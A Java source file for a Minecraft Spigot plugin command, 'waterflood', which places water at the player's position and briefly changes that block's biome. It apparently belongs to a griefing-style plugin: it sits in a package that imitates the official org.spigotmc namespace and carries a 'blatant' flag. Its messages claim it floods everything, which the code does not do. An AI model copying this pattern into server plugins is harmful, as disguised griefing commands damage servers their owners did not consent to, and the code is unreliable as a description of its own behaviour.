package org.spigotmc.commands.impl.world;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.block.Biome;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "waterflood",
    usage = "waterflood",
    desc = "Flood everything with water",
    blatant = true
)
public class WaterFlood extends CommandListener{

    public static boolean isFlooding = false;

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        isFlooding = !isFlooding;
        if (isFlooding) {
            Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
                p.getLocation().getBlock().setType(Material.WATER);
                Biome originalBiome = p.getLocation().getBlock().getBiome();
                p.getLocation().getBlock().setBiome(Biome.PLAINS);
                p.sendMessage(Settings.PREFIX("The water is now flooding everything"));
                Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), () -> {
                    p.getLocation().getBlock().setBiome(originalBiome);
                }, 20L * 5);
            });
        } else {
            p.sendMessage(Settings.PREFIX("The water is no longer flooding everything"));
        }
    }
}
